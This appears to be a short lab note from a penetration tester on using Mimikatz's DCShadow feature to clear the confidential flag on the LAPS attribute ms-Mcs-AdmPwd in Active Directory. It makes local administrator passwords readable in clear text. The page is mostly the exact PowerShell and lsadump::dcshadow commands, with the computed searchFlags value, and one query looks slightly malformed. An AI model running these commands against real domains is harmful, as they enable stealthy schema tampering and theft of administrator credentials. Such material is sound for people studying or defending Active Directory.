<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Attacking searchFlags Attribute With Mimi DCShadow</title>
</head><body>Modifying searchFlags attribute:<br/>
The attribute of our interest is ms-Mcs-AdmPwd which is a confidential attribute.Letâ€™s first identify searchFlags attribute of ms-Mcs-AdmPwd. We will be using active directory PS module.<br/>
<br/>
The <a href="https://msdn.microsoft.com/en-us/library/cc223153.aspx">searchFlags</a>&nbsp;attribute value is 904 (0x388). From this value we need to remove the 7th bit which is the confidential attribute. CF which is the 7 th bit (0x00000080) ie., After removing the confidential value(0x388-0x80) the new value is 0x308 ie., 776. We will leverage DC Shadow attack to modify the searchFlags attribute.<br/>
<br/>
This requires Mimikatz and a DC Shadow attack (ie domain admin)<br/>
<br/>
Find search flags:<br/>
Get-ADReplicationAttributeMetadata -Object "CN=ms-MCS-AdmPwd,CN=Schema,CN=Configuration,DC=AJLAB,DC=COM" -server AJLABWIN2K12DC -Properties searchFlags<br/>
<br/>
Note the AttributeValue<br/>
<br/>
Mimikatz # lsadump::dcshadow /dc:AJLABWIN2K12DC.AJLAB.COM /object:CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=AJLAB,DC=COM /attribute:searchFlags /value:776 /reploriginatingusn:USN_HERE /reploriginatinguid:{UID HERE} /reploriginatingtime: "TIME HERE"<br/>
<br/>
Mimikatz # lsadump::dcshadow /push /schema /dc:AJLABWIN2K12DC.AJLAB.COM<br/>
<br/>
Now, if you issue:<br/>
Get-ADObject -Identity CN=LAB-WIN7CLONE,OU=Managed Computers - LAPS,DC=AJLAB,ms-Mcs-AdmPwd -server AJLABWIN2K12DC.AJLAB.COM | select ms-Mcs-AdmPwd<br/>
<br/>
It should print in clear-text since the attribute is no longer confidential.</body></html>